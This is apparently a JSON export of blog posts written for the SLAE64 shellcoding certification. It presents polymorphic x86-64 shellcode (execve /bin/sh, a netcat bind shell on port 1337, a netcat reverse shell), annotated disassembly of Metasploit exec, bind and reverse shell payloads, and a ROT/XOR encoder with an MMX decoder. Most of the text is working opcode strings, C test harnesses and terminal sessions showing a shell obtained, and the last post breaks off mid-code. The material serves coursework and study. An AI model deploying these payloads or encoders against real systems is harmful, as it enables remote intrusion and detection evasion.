\\xf5\\x99\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x48\\xc1\\xeb\\x08\\x48\\x31\\xf6\\xf8\\x53\\x48\\x89\\xe7\\x48\\xff\\xcd\\x50\\x48\\xf7\\xe5\\x57\\x4c\\x8d\\x56\\xc2\\x48\\x89\\xe6\\x49\\xf7\\xe4\\x4c\\x8d\\x4d\\x09\\xb1\\x1b\\x66\\x6a\\x20\\x66\\x5b\\x88\\xd8\\x04\\x1b\\x0f\\x05C format#include&lt;stdio.h&gt;#include&lt;string.h&gt;unsigned char code[] = \\\"\\xf5\\x99\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x48\\xc1\\xeb\\x08\\x48\\x31\\xf6\\xf8\\x53\\x48\\x89\\xe7\\x48\\xff\\xcd\\x50\\x48\\xf7\\xe5\\x57\\x4c\\x8d\\x56\\xc2\\x48\\x89\\xe6\\x49\\xf7\\xe4\\x4c\\x8d\\x4d\\x09\\xb1\\x1b\\x66\\x6a\\x20\\x66\\x5b\\x88\\xd8\\x04\\x1b\\x0f\\x05\";main(){ printf(\"Shellcode Length: %d\\n\", strlen(code)); int (*ret)() = (int(*)())code; ret();}EndGame #1whitecr0wz@SLAE64:~/assembly/assignments/Assignment_6/1_shellcode$ gcc 1_shellcode.c -o 1_shellcode -fno-stack-protector -z execstack -w whitecr0wz@SLAE64:~/assembly/assignments/Assignment_6/1_shellcode$ ./1_shellcode Shellcode Length: 59$Original size: 30Final size: 59Increment: 97%Netcat Bind-Shell (Shellcode #2)The second shellcode from the three will perform a bind-shell in port 1337 through the use of the tool netcat. It can be found here.Original code:xor \trdx,rdxmov \trdi,0x636e2f6e69622fffshr\trdi,0x08push \trdimov \trdi,rspmov\trcx,0x68732f6e69622fffshr\trcx,0x08push \trcxmov\trcx,rspmov rbx,0x652dffffffffffffshr\trbx,0x30push\trbxmov\trbx,rspmov\tr10,0x37333331ffffffffshr \tr10,0x20push \tr10mov\tr10,rspmov\tr9,0x702dffffffffffffshr\tr9,0x30push \tr9mov\tr9,rspmov \tr8,0x6c2dffffffffffffshr\tr8,0x30push \tr8mov\tr8,rsppush\trdx ;push NULLpush \trcx ;push address of 'bin/sh'push\trbx ;push address of '-e'push\tr10 ;push address of '1337'push\tr9 ;push address of '-p'push\tr8 ;push address of '-l'push \trdi ;push address of '/bin/nc'mov \trsi,rspmov \tal,59syscallThere aren’t many things that we can do. Nonetheless, we can apply similar techniques as we did on the previous shellcode.Final code:global _start_start:xor rdx, rdxinc al ; Garbage NOPinc cl ; Garbage NOPmov \trdi,0x636e2f6e69622fffshr\trdi,0x08push \trdimov \trdi,rspmov\trcx,0x68732f6e69622fffshr\trcx,0x08stc ; Garbage NOPpush \trcxnop ; Garbage NOPnop ; Garbage NOPmov\trcx,rspmov rbx,0x652dffffffffffffshr al, 2 ; Garbage NOPshr\trbx,0x30cdq ; Garbage NOPnop ; Garbage NOPcmc ; Garbage NOPpush\trbxmov\trbx,rspmov\tr10,0x37333331ffffffffpush r15 ; Garbage NOPpop r14 ; Garbage NOPpush r15 ; Garbage NOPpop r14 ; Garbage NOPshr \tr10,0x20push \tr10mov\tr10,rspmov\tr9,0x702dffffffffffffshr\tr9,0x30push \tr9mov\tr9,rspmov \tr8,0x6c2dffffffffffffshr\tr8,0x30loop:rol rbp, 59 ; Garbage NOPror r14, 60 ; Garbage NOPshr r13, 8 ; Garbage NOPpush \tr8mov\tr8,rsppush\trdx ;push NULLpush \trcx ;push address of 'bin/sh'push\trbx ;push address of '-e'push\tr10 ;push address of '1337'nop ; Garbage NOPstc ; Garbage NOPlea r12, [rsp - 0xFF] ; Garbage NOPnop ; Garbage NOPcld ; Garbage NOPnop ; Garbage NOPpush\tr9 ;push address of '-p'push\tr8 ;push address of '-l'push \trdi ;push address of '/bin/nc'mov \trsi,rspstc ; Garbage NOPcmc ; Garbage NOPpush rsp ; Garbage NOPpop r14 ; Garbage NOPpush r15 ; Garbage NOPpop rax ; Garbage NOPmov \tal, 0x0c ; Gives AL the value 0C.add al, 0x2f ; Adds AL with 2F, this will grant AL the value 3B, which is the syscall number for execve.syscallLet’s test this shellcode once again.whitecr0wz@SLAE64:~/assembly/assignments/Assignment_6/2_shellcode$ nasm -f elf64 1.asm -o 1.o &amp;&amp; ld 1.o -o 1 &amp;&amp; for i in $(objdump -d ./1 -M intel |grep \"^ \" |cut -f2); do echo -n '\\x'$i; done;echoC format#include&lt;stdio.h&gt;#include&lt;string.h&gt;unsigned char code[] = \\\"\\x48\\x31\\xd2\\xfe\\xc0\\xfe\\xc1\\x48\\xbf\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x6e\\x63\\x48\\xc1\\xef\\x08\\x57\\x48\\x89\\xe7\\x48\\xb9\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x48\\xc1\\xe9\\x08\\xf9\\x51\\x90\\x90\\x48\\x89\\xe1\\x48\\xbb\\xff\\xff\\xff\\xff\\xff\\xff\\x2d\\x65\\xc0\\xe8\\x02\\x48\\xc1\\xeb\\x30\\x99\\x90\\xf5\\x53\\x48\\x89\\xe3\\x49\\xba\\xff\\xff\\xff\\xff\\x31\\x33\\x33\\x37\\x41\\x57\\x41\\x5e\\x41\\x57\\x41\\x5e\\x49\\xc1\\xea\\x20\\x41\\x52\\x49\\x89\\xe2\\x49\\xb9\\xff\\xff\\xff\\xff\\xff\\xff\\x2d\\x70\\x49\\xc1\\xe9\\x30\\x41\\x51\\x49\\x89\\xe1\\x49\\xb8\\xff\\xff\\xff\\xff\\xff\\xff\\x2d\\x6c\\x49\\xc1\\xe8\\x30\\x48\\xc1\\xc5\\x3b\\x49\\xc1\\xce\\x3c\\x49\\xc1\\xed\\x08\\x41\\x50\\x49\\x89\\xe0\\x52\\x51\\x53\\x41\\x52\\x90\\xf9\\x4c\\x8d\\xa4\\x24\\x01\\xff\\xff\\xff\\x90\\xfc\\x90\\x41\\x51\\x41\\x50\\x57\\x48\\x89\\xe6\\xf9\\xf5\\x54\\x41\\x5e\\x41\\x57\\x58\\xb0\\x0c\\x04\\x2f\\x0f\\x05\";main(){ printf(\"Shellcode Length: %d\\n\", strlen(code)); int (*ret)() = (int(*)())code; ret();}EndGame #2whitecr0wz@SLAE64:~/assembly/assignments/Assignment_6/2_shellcode$ gcc 2_shellcode.c -o 2_shellcode -fno-stack-protector -z execstack -w whitecr0wz@SLAE64:~/assembly/assignments/Assignment_6/2_shellcode$ ./2_shellcode Shellcode Length: 187─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────root@whitecr0wz:~# rlwrap nc 192.168.100.205 1337 -v 192.168.100.205: inverse host lookup failed: Unknown host(UNKNOWN) [192.168.100.205] 1337 (?) openpython -c 'import pty;pty.spawn(\"/bin/bash\")'; &lt;0wz/assembly/assignments/Assignment_6/2_shellcode$ id id uid=1000(whitecr0wz) gid=1000(whitecr0wz) groups=1000(whitecr0wz),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)&lt;0wz/assembly/assignments/Assignment_6/2_shellcode$Original size: 131Final size: 187Increment: 43%Reverse-shell Shellcode (Shellcode #3)For the final shellcode, I have chosen to use a reverse-shell that arranges a connection towards the localhost on port 1337. It can be found here.Original code:xor \trdx,rdxmov \trdi,0x636e2f6e69622fffshr\trdi,0x08push \trdimov \trdi,rspmov\trcx,0x68732f6e69622fffshr\trcx,0x08push \trcxmov\trcx,rspmov rbx,0x652dffffffffffffshr\trbx,0x30push\trbxmov\trbx,rspmov\tr10,0x37333331ffffffffshr \tr10,0x20push \tr10mov\tr10,rspjmp short ipcontinue:pop \tr9push\trdx ;push NULLpush \trcx ;push address of 'bin/sh'push\trbx ;push address of '-e'push\tr10 ;push address of '1337'push\tr9 ;push address of 'ip'push \trdi ;push address of '/bin/nc'mov \trsi,rspmov \tal,59syscallip:\tcall continue\tdb \"127.0.0.1\"Once again, there isn’t much to comment, other than the fact that we can apply the aforementioned polymorphic techniques against this shellcode.Final code:global _start_start:xor \trdx,rdxnop ; Garbage NOPnop ; Garbage NOPmov \trdi,0x636e2f6e69622fffshr\trdi,0x08dec al ; Garbage NOPpush \trdimov \trdi,rspmov\trcx,0x68732f6e69622fffshr\trcx,0x08dec al ; Garbage NOPpush \trcxinc cl ; Garbage NOPdec cl ; Garbage NOPmov\trcx,rspmov rbx,0x652dffffffffffffstd ; Garbage NOPcwd ; Garbage NOPshr\trbx,0x30cmc ; Garbage NOPpush\trbxmov\trbx,rspmov\tr10,0x37333331ffffffffshr \tr10,0x20std ; Garbage NOPpush \tr10mov\tr10,rspjmp short ipcontinue:pop \tr9push\trdx ;push NULLpush \trcx ;push address of 'bin/sh'nop ; Garbage NOPinc dl ; Garbage NOP dec dl ; Garbage NOPpush\trbx ;push address of '-e'inc cl ; Garbage NOPdec cl ; Garbage NOPnop ; Garbage NOPpush\tr10 ;push address of '1337'dec al ; Garbage NOPpush\tr9 ;push address of 'ip'inc bl ; Garbage NOPdec bl ; Garbage NOPpush \trdi ;push address of '/bin/nc'nop ; Garbage NOPmov \trsi,rspmov al, 59syscallip:\tcall continue\tdb \"127.0.0.1\"Let’s assemble, link, and test this shellcode.whitecr0wz@SLAE64:~/assembly/assignments/Assignment_6/3_shellcode$ nasm -f elf64 1.asm -o 1.o &amp;&amp; ld 1.o -o 1 &amp;&amp; for i in $(objdump -d ./1 -M intel |grep \"^ \" |cut -f2); do echo -n '\\x'$i; done;echoC format#include&lt;stdio.h&gt;#include&lt;string.h&gt;unsigned char code[] = \\\"\\x48\\x31\\xd2\\x90\\x90\\x48\\xbf\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x6e\\x63\\x48\\xc1\\xef\\x08\\xfe\\xc8\\x57\\x48\\x89\\xe7\\x48\\xb9\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x48\\xc1\\xe9\\x08\\xfe\\xc8\\x51\\xfe\\xc1\\xfe\\xc9\\x48\\x89\\xe1\\x48\\xbb\\xff\\xff\\xff\\xff\\xff\\xff\\x2d\\x65\\xfd\\x66\\x99\\x48\\xc1\\xeb\\x30\\xf5\\x53\\x48\\x89\\xe3\\x49\\xba\\xff\\xff\\xff\\xff\\x31\\x33\\x33\\x37\\x49\\xc1\\xea\\x20\\xfd\\x41\\x52\\x49\\x89\\xe2\\xeb\\x22\\x41\\x59\\x52\\x51\\x90\\xfe\\xc2\\xfe\\xca\\x53\\xfe\\xc1\\xfe\\xc9\\x90\\x41\\x52\\xfe\\xc8\\x41\\x51\\xfe\\xc3\\xfe\\xcb\\x57\\x90\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05\\xe8\\xd9\\xff\\xff\\xff\\x31\\x32\\x37\\x2e\\x30\\x2e\\x30\\x2e\\x31\";main(){ printf(\"Shellcode Length: %d\\n\", strlen(code));\tint (*ret)() = (int(*)())code;\tret();}EndGame #3whitecr0wz@SLAE64:~/assembly/assignments/Assignment_6/3_shellcode$ gcc 3_shellcode.c -o 3_shellcode -fno-stack-protector -z execstack -w whitecr0wz@SLAE64:~/assembly/assignments/Assignment_6/3_shellcode$ ./3_shellcode Shellcode Length: 141─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────whitecr0wz@SLAE64:~$ rlwrap nc -lvp 1337 listening on [any] 1337 ...connect to [127.0.0.1] from localhost [127.0.0.1] 55804python -c 'import pty;pty.spawn(\"/bin/bash\")';&lt;0wz/assembly/assignments/Assignment_6/3_shellcode$ id id uid=1000(whitecr0wz) gid=1000(whitecr0wz) groups=1000(whitecr0wz),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)&lt;0wz/assembly/assignments/Assignment_6/3_shellcode$Original size: 109Final size: 141Increment: 30%CodeThis blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/Student ID: SLAE64-27812/PA-27812You can find all of the used resources within this post here." }, { "title": "SLAE64 - Assignment 5 - Analyzing 3rd party Shellcode", "url": "/posts/SLAE64-Analyzing-Shellcode/", "categories": "SLAE64", "tags": "assembly, shellcoding", "date": "2021-01-26 05:44:00 +0000", "snippet": "These series of posts starting with the prefix “SLAE64 - Assignment” will be created in order to fulfill the requirements of the SLAE64 certification.The fifth assignment from the seven requires analyzing three shellcodes generated by Metasploit in the x86_64 format. Furthermore, it is required to report the findings during the analysis.linux/x64/exec (Shellcode #1)The first shellcode to be analyzed will execute the operation /bin/lsGenerating the shellcode with msfvenom:root@whitecr0wz:~# msfvenom -p linux/x64/exec CMD=/bin/ls -i 0 -f c [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload[-] No arch selected, selecting arch: x64 from the payloadNo encoder specified, outputting raw payloadPayload size: 47 bytesFinal size of c file: 224 bytesunsigned char buf[] = \"\\x6a\\x3b\\x58\\x99\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x00\\x53\"\"\\x48\\x89\\xe7\\x68\\x2d\\x63\\x00\\x00\\x48\\x89\\xe6\\x52\\xe8\\x08\\x00\"\"\\x00\\x00\\x2f\\x62\\x69\\x6e\\x2f\\x6c\\x73\\x00\\x56\\x57\\x48\\x89\\xe6\"\"\\x0f\\x05\";root@whitecr0wz:~#Ndisasmroot@whitecr0wz:~# echo -ne \"\\x6a\\x3b\\x58\\x99\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x00\\x53\\x48\\x89\\xe7\\x68\\x2d\\x63\\x00\\x00\\x48\\x89\\xe6\\x52\\xe8\\x08\\x00\\x00\\x00\\x2f\\x62\\x69\\x6e\\x2f\\x6c\\x73\\x00\\x56\\x57\\x48\\x89\\xe6\\x0f\\x05\" | ndisasm -u - -b 64 00000000 6A3B push byte +0x3b ; Pushes 59 (execve syscall value) into the stack.00000002 58 pop rax ; Pops this value into RAX.00000003 99 cdq ; EDX:EAX ← sign-extend of EAX. Commonly used to clean RDX.00000004 48BB2F62696E2F73 mov rbx,0x68732f6e69622f ; Moves '/bin/sh' into RBX. -68000000000E 53 push rbx ; The value in RBX is pushed into the stack.0000000F 4889E7 mov rdi,rsp ; The value of RSP is copied into RDI.00000012 682D630000 push qword 0x632d ; The value '-c' is pushed into the stack.00000017 4889E6 mov rsi,rsp ; The value of RSP is copied into RSI.0000001A 52 push rdx ; Pushes the NULL DWORD found in RDX.0000001B E808000000 call 0x28 ; Calls the function that pushes '/bin/ls' into RSI, then pushes RSI into the stack.00000020 2F db 0x2f00000021 62 db 0x6200000022 696E2F6C730056 imul ebp,[rsi+0x2f],dword 0x5600736c00000029 57 push rdi ; Pushes the value of RDI (/bin/sh) into the stack.0000002A 4889E6 mov rsi,rsp ; The value of RSP is copied into RSI,0000002D 0F05 syscall ; The syscall is executed.root@whitecr0wz:~#GDBGenerating the shellcode with msfvenom:root@whitecr0wz:~# msfvenom -p linux/x64/exec CMD=/bin/ls -i 0 -f dw[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload[-] No arch selected, selecting arch: x64 from the payloadNo encoder specified, outputting raw payloadPayload size: 48 bytesFinal size of dw file: 146 bytes0x99583b6a, 0x622fbb48, 0x732f6e69, 0x48530068, 0x2d68e789, 0x48000063, 0xe852e689, 0x00000008,0x6e69622f, 0x00736c2f, 0x89485756, 0x00050fe6root@whitecr0wz:~#Contents of dissect_1global _start_start: jmp short mastermain: pop rbp jmp rbpmaster: call main shellcode: dd 0x99583b6a, 0x622fbb48, 0x732f6e69, 0x48530068, 0x2d68e789, 0x48000063, 0xe852e689, 0x00000008, 0x6e69622f, 0x00736c2f, 0x89485756, 0x00050fe6Let’s analyze the value of RBP when the instruction pop rbp is executed.whitecr0wz@SLAE64:~/assembly/assignments/Assignment_5/dissect1$ gdb -q ./dissect_1 Reading symbols from ./dissect_1...(no debugging symbols found)...done.(gdb) break mainBreakpoint 1 at 0x401002(gdb) runStarting program: /home/whitecr0wz/assembly/assignments/Assignment_5/dissect1/dissect_1 Breakpoint 1, 0x0000000000401002 in main ()(gdb) disassembleDump of assembler code for function main:=&gt; 0x0000000000401002 &lt;+0&gt;: pop %rbp 0x0000000000401003 &lt;+1&gt;: jmpq *%rbpEnd of assembler dump.(gdb) nexti0x0000000000401003 in main ()(gdb) x/7s $rbp 0x40100a &lt;shellcode&gt;: \"j;X\\231H\\273/bin/sh\"0x401018 &lt;shellcode+14&gt;: \"SH\\211\\347h-c\"0x401020 &lt;shellcode+22&gt;: \"\"0x401021 &lt;shellcode+23&gt;: \"H\\211\\346R\\350\\b\"0x401028 &lt;shellcode+30&gt;: \"\"0x401029 &lt;shellcode+31&gt;: \"\"0x40102a &lt;shellcode+32&gt;: \"/bin/ls\"(gdb)Conclusion (#1 Shellcode)Indeed, it seems as if /bin/ls is the last thing to be pushed into the stack. Furthermore, there is a great quantity of space between -c and /bin/ls itself.linux/x64/shell_bind_tcp (#2 Shellcode)Generating shellcoderoot@whitecr0wz:~# msfvenom -p linux/x64/shell_bind_tcp -i 0 -f c[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload[-] No arch selected, selecting arch: x64 from the payloadNo encoder specified, outputting raw payloadPayload size: 86 bytesFinal size of c file: 386 bytesunsigned char buf[] =\"\\x6a\\x29\\x58\\x99\\x6a\\x02\\x5f\\x6a\\x01\\x5e\\x0f\\x05\\x48\\x97\\x52\"\"\\xc7\\x04\\x24\\x02\\x00\\x11\\x5c\\x48\\x89\\xe6\\x6a\\x10\\x5a\\x6a\\x31\"\"\\x58\\x0f\\x05\\x6a\\x32\\x58\\x0f\\x05\\x48\\x31\\xf6\\x6a\\x2b\\x58\\x0f\"\"\\x05\\x48\\x97\\x6a\\x03\\x5e\\x48\\xff\\xce\\x6a\\x21\\x58\\x0f\\x05\\x75\"\"\\xf6\\x6a\\x3b\\x58\\x99\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x00\"\"\\x53\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\\x0f\\x05\";root@whitecr0wz:~#Ndisasmwhitecr0wz@SLAE64:~/assembly/assignments/Assignment_5/dissect2$ echo -ne \"\\x6A\\x29\\x58\\x99\\x6A\\x02\\x5F\\x6A\\x01\\x5E\\x0F\\x05\\x48\\x97\\x52\\xC7\\x04\\x24\\x02\\x00\\x11\\x5C\\x48\\x89\\xE6\\x6A\\x10\\x5A\\x6A\\x31\\x58\\x0F\\x05\\x6A\\x32\\x58\\x0F\\x05\\x48\\x31\\xF6\\x6A\\x2B\\x58\\x0F\\x05\\x48\\x97\\x6A\\x03\\x5E\\x48\\xFF\\xCE\\x6A\\x21\\x58\\x0F\\x05\\x75\\xF6\\x6A\\x3B\\x58\\x99\\x48\\xBB\\x2F\\x62\\x69\\x6E\\x2F\\x73\\x68\\x00\\x53\\x48\\x89\\xE7\\x52\\x57\\x48\\x89\\xE6\\x0F\\x05\" | ndisasm -u - -b 64 00000000 6A29 push byte +0x29 ; Pushes syscall value 41 (value of the socket syscall) into the stack. 00000002 58 pop rax ; Pops this value into RAX.00000003 99 cdq ; EDX:EAX ← sign-extend of EAX. Commonly used to clean RDX.00000004 6A02 push byte +0x2 ; Pushes value 2 into the stack.00000006 5F pop rdi ; Pops this value into RDI. This will grant RDI with AF_INET, satisfying the *domain* argument.00000007 6A01 push byte +0x1 ; Pushes value 1 into the stack.00000009 5E pop rsi ; Pops this value into RSI. This will grant RSI with SOCK_STREAM, satisfying the *type* argument.0000000A 0F05 syscall ; Executes the syscall.0000000C 4897 xchg rax,rdi ; Exchanges the value between RAX and RDI. This saves the value in RDI for sockfd operations.0000000E 52 push rdx ; Pushes the value of RDX. As it is a NULL, the NULL-DWORD is pushed as a 0, which is an argument of the const ; struct addr.0000000F C704240200115C mov dword [rsp],0x5c110002 ; Pushes 4444 in hex into the stack. However, as 4444 is not big enough for RSP, a few NULLs are parsed.00000016 4889E6 mov rsi,rsp ; The value of RSP is copied into RSI.00000019 6A10 push byte +0x10 ; The value \"16\" is pushed into the stack.0000001B 5A pop rdx ; Pops this value into RDX. This satisfies the length argument.0000001C 6A31 push byte +0x31 ; Pushes syscall value 49 (value of the bind syscall) into the stack. 0000001E 58 pop rax ; Pops this value into RAX.0000001F 0F05 syscall ; Executes the syscall.00000021 6A32 push byte +0x32 ; Pushes syscall value 50 (value of the listen syscall) into the stack. 00000023 58 pop rax ; Pops this value into RAX.00000024 0F05 syscall ; Executes the syscall.00000026 4831F6 xor rsi,rsi ; Zeroes out RSI.00000029 6A2B push byte +0x2b ; Pushes syscall value 43 (value of the accept syscall) into the stack. 0000002B 58 pop rax ; Pops this value into RAX.0000002C 0F05 syscall ; Executes the syscall.0000002E 4897 xchg rax,rdi ; Exchanges the value between RAX and RDI. This is done in order to satisfy further sockfd arguments.00000030 6A03 push byte +0x3 ; Pushes value 3 into the stack.00000032 5E pop rsi ; Pops this value into RSI.00000033 48FFCE dec rsi ; Decrements RSI.00000036 6A21 push byte +0x21 ; Pushes syscall value 33 (value of the dup2 syscall) into the stack. 00000038 58 pop rax ; Pops this value into RAX.00000039 0F05 syscall ; Executes the syscall.0000003B 75F6 jnz 0x33 ; Jump if the Zero flag (ZF) hasn't been set. This means that until RSI doesn't hit zero (through the dec rsi ; instruction), the loop will not stop.0000003D 6A3B push byte +0x3b ; Pushes syscall value 59 (value of the execve syscall) into the stack. 0000003F 58 pop rax ; Pops this value into RAX.00000040 99 cdq ; EDX:EAX ← sign-extend of EAX. Commonly used to clean RDX.00000041 48BB2F62696E2F73 mov rbx,0x68732f6e69622f ; Moves value \"/bin/sh\" into RBX. -68000000004B 53 push rbx ; Pushes the RBX into the stack.0000004C 4889E7 mov rdi,rsp ; The value of RSP is copied into RDI.0000004F 52 push rdx ; RDX is pushed. It is most likely that this is simply a NULL-DWORD.00000050 57 push rdi ; RDI (/bin/sh) is pushed into the stack.00000051 4889E6 mov rsi,rsp ; The value of RSP is copied into RSI.00000054 0F05 syscall ; Executes the syscall.Conclusion (#2 Shellcode)Sadly enough, there isn’t much to comment, as most of the important explanation has been done through the comments. It simply is a shell that binds to port 4444.linux/x64/shell_reverse_tcp (#3 Shellcode)Generating shellcoderoot@whitecr0wz:~# msfvenom -p linux/x64/shell_reverse_tcp -i 0 -f c[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload[-] No arch selected, selecting arch: x64 from the payloadNo encoder specified, outputting raw payloadPayload size: 74 bytesFinal size of c file: 335 bytesunsigned char buf[] =\"\\x6a\\x29\\x58\\x99\\x6a\\x02\\x5f\\x6a\\x01\\x5e\\x0f\\x05\\x48\\x97\\x48\"\"\\xb9\\x02\\x00\\x11\\x5c\\xc0\\xa8\\x64\\xd6\\x51\\x48\\x89\\xe6\\x6a\\x10\"\"\\x5a\\x6a\\x2a\\x58\\x0f\\x05\\x6a\\x03\\x5e\\x48\\xff\\xce\\x6a\\x21\\x58\"\"\\x0f\\x05\\x75\\xf6\\x6a\\x3b\\x58\\x99\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\"\"\\x73\\x68\\x00\\x53\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\\x0f\\x05\";root@whitecr0wz:~#Ndisasmroot@whitecr0wz:~# echo -ne \"\\x6a\\x29\\x58\\x99\\x6a\\x02\\x5f\\x6a\\x01\\x5e\\x0f\\x05\\x48\\x97\\x48\\xb9\\x02\\x00\\x11\\x5c\\xc0\\xa8\\x64\\xd6\\x51\\x48\\x89\\xe6\\x6a\\x10\\x5a\\x6a\\x2a\\x58\\x0f\\x05\\x6a\\x03\\x5e\\x48\\xff\\xce\\x6a\\x21\\x58\\x0f\\x05\\x75\\xf6\\x6a\\x3b\\x58\\x99\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x00\\x53\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\\x0f\\x05\" | ndisasm -u - -b 64 00000000 6A29 push byte +0x29 ; Pushes syscall value 41 (value of the socket syscall) into the stack. 00000002 58 pop rax ; Pops this value into RAX.00000003 99 cdq ; EDX:EAX ← sign-extend of EAX. Commonly used to clean RDX.00000004 6A02 push byte +0x2 ; Pushes the value 2 into the stack.00000006 5F pop rdi ; Pops this value into RDI. This will grant RDI with AF_INET, satisfying the *domain* argument.00000007 6A01 push byte +0x1 ; Pushes the value 1 into the stack.00000009 5E pop rsi ; Pops this value into RSI. This will grant RSI with SOCK_STREAM, satisfying the *type* argument.0000000A 0F05 syscall ; Executes the syscall.0000000C 4897 xchg rax,rdi ; Exchanges the value between RAX and RDI. This is done in order to satisfy further sockfd arguments.0000000E 48B90200115CC0A8 mov rcx,0xd664a8c05c110002 ; Pushes \"192.168.100.214:4444\" within the hex format in reverse. Furthermore, as this string is not long enough to ; fulfill RCX, additional nulls are parsed. -64D600000018 51 push rcx ; RCX is pushed into the stack.00000019 4889E6 mov rsi,rsp ; The value of RSP is copied into RSI.0000001C 6A10 push byte +0x10 ; Pushes the value 16 into the stack.0000001E 5A pop rdx ; Pops this value into RDX. This satisfies the length argument.0000001F 6A2A push byte +0x2a ; Pushes syscall value 42 (value of the socket connect) into the stack.00000021 58 pop rax ; Pops this value into RAX.00000022 0F05 syscall ; Executes the syscall.00000024 6A03 push byte +0x3 ; The value 3 is pushed into the stack.00000026 5E pop rsi ; Pops this value into RSI.00000027 48FFCE dec rsi ; Decrements RSI.0000002A 6A21 push byte +0x21 ; Pushes syscall value 33 (value of the socket dup2) into the stack.0000002C 58 pop rax ; Pops this value into RAX.0000002D 0F05 syscall ; Executes the syscall.0000002F 75F6 jnz 0x27 ; Jump if the Zero flag (ZF) hasn't been set. This means that until RSI doesn't hit zero (through the dec rsi ; instruction), the loop will not stop.00000031 6A3B push byte +0x3b ; Pushes syscall value 59 (value of the execve syscall) into the stack.00000033 58 pop rax ; Pops this value into RAX.00000034 99 cdq ; EDX:EAX ← sign-extend of EAX. Commonly used to clean RDX.00000035 48BB2F62696E2F73 mov rbx,0x68732f6e69622f ; Moves value \"/bin/sh\" into RBX. -68000000003F 53 push rbx ; Pushes the RBX into the stack.00000040 4889E7 mov rdi,rsp ; The value of RSP is copied into RDI.00000043 52 push rdx ; RDX is pushed. It is most likely that this is simply a NULL-DWORD.00000044 57 push rdi ; RDI (/bin/sh) is pushed into the stack.00000045 4889E6 mov rsi,rsp ; The value of RSP is copied into RSI.00000048 0F05 syscall ; Executes the syscall.Once again, there isn’t much to comment, as most of the important explanation has been done through the comments. It simply is a reverse-shell that arranges a connection towards the local address in port 4444.CodeThis blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/Student ID: SLAE64-27812/PA-27812You can find all of the used resources within this post here." }, { "title": "SLAE64 - Assignment 4 - Custom Insertion Encoder", "url": "/posts/SLAE64-Encoder/", "categories": "SLAE64", "tags": "assembly, shellcoding", "date": "2021-01-25 05:44:00 +0000", "snippet": "IntroductionThese series of posts starting with the prefix “Assignment” will be created in order to fulfill the requirements of the SLAE64 certification. Today we are going to have a close look at a Custom Encoder.The fourth assignment from the seven requires the creation of a Custom Encoder, similar to the one shown in the course as the “Insertion Encoder”. This should be written in the Assembly language, and converting such into shellcode. Moreover, it is required that such is tested later on the C format.The EncoderAs for the encoder itself, I have chosen to combine to simple techniques: ROT &amp; XOR encoding. This encoder will: Perform a positive ROT operation “shifting the bytes forward”, 24 times. XOR all bytes by 36.The DecoderThe decoder follows an interesting procedure: Performs a negative ROT operation “shifting the bytes backwards”, 24 times. XORs all bytes by 36. However, this will be done through the MMX registers.The encoder#!/usr/bin/pythonshellcode = (\"\\x48\\x31\\xc0\\x48\\x31\\xf6\\x48\\x31\\xdb\\x50\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x53\\x48\\x89\\xe7\\x50\\x48\\x89\\xe2\\x57\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05\")encoded = \"\"encoded2 = \"\"rot = 24print 'Encoded shellcode ...'for x in bytearray(shellcode) : y = x^0x36 z = (y + rot)%256 encoded += '\\\\x' encoded += '%02x' % z encoded2 += '0x' encoded2 += '%02x,' % zprint '\"' + encoded + '\"'print encoded2print 'Len: %d' % len(bytearray(shellcode))Final codeglobal _start_start: jmp short master ; Jumps to function \"master\".main: pop rbp ; Pops the value to use when XORing in RBP. lea rdi, [rbp + 8] ; Points to the shellcode. xor rcx, rcx ; Zeroes out RCX. mov cl, bytes_length ; Gives cl the length of the shellcode. This sets a counter.rot: sub byte [rdi], 24 ; Negatively rotates RDI by 24. inc rdi ; Increments RDI. loop rot ; Loops this process. lea rdi, [rbp + 8] ; Points to the shellcode. xor rcx, rcx ; Zeroes out RCX. mov cl, 5 ; Gives cl the length of the shellcode. As the following operation will be done from 8-bytes in 8-bytes, it isn't required to specify the complete ; length of the shellcode.xor: movq mm0, qword [rbp] ; Saves QWORD RBP into MM0. movq mm1, qword [rdi] ; Saves QWORD RDI into MM1. pxor mm0, mm1 ; XORs MM0 and MM1. movq qword [rdi], mm0 ; Saves the value of MM0 (XORed piece of shellcode) into RDI (stores original shellcode). add rdi, 8 ; Adds 8 to RDI in order to continue with the process. loop xor ; Loops this process. jmp bytes ; Jumps to the original shellcode.master: call main value: db 0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 0x36 bytes: db 